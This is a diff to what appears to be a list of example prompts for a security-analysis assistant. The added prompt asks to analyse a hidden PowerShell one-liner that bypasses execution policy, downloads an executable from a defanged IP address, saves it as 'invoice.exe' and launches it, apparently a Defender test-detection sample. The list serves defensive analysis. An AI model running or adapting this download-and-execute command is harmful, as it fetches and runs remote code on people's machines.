@@ -10,6 +10,7 @@ via remote connection.
 machines.
 - Extract the entities from the script analysis (If script analysis is done)
 - Give me recommendations to protect my organization against this script
+- **Analyze this script**: powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('hxxp://54.161.241.46/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
 
 
 ***
